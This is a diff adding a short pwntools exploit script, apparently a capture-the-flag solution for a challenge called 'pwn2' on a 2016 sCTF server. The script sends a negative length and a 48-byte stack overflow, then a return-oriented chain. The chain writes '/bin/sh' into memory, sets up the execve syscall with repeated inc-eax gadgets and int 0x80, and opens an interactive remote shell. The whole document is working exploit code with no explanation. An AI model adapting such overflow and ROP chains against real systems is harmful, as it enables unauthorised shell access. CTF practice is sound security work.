@@ -1,0 +1,23 @@
+from pwn import *
+#p=process('./pwn2')
+p=remote('problems2.2016q1.sctf.io','1338')
+p.recv()
+p.sendline('-1')
+int80=0x080484D0
+inceax=0x080484D3
+get_n=0x80484E3
+vlun=0x804852F
+data=0x804A024
+popebx=0x804835D
+inceax=0x80484D3
+atoi=0x80483C0
+addesp=0x804835a
+p.recv()
+p.sendline('a'*48+p32(get_n)+p32(vlun)+p32(data)+p32(0x88888888))
+p.sendline('/bin/sh')
+p.recv()
+p.sendline('-1')
+p.recv()
+p.sendline('a'*48+p32(atoi)+p32(addesp)+p32(data+7)+p32(0x12345678)+p32(data)+p32(inceax)*11+p32(int80))
+p.recv()
+p.interactive()
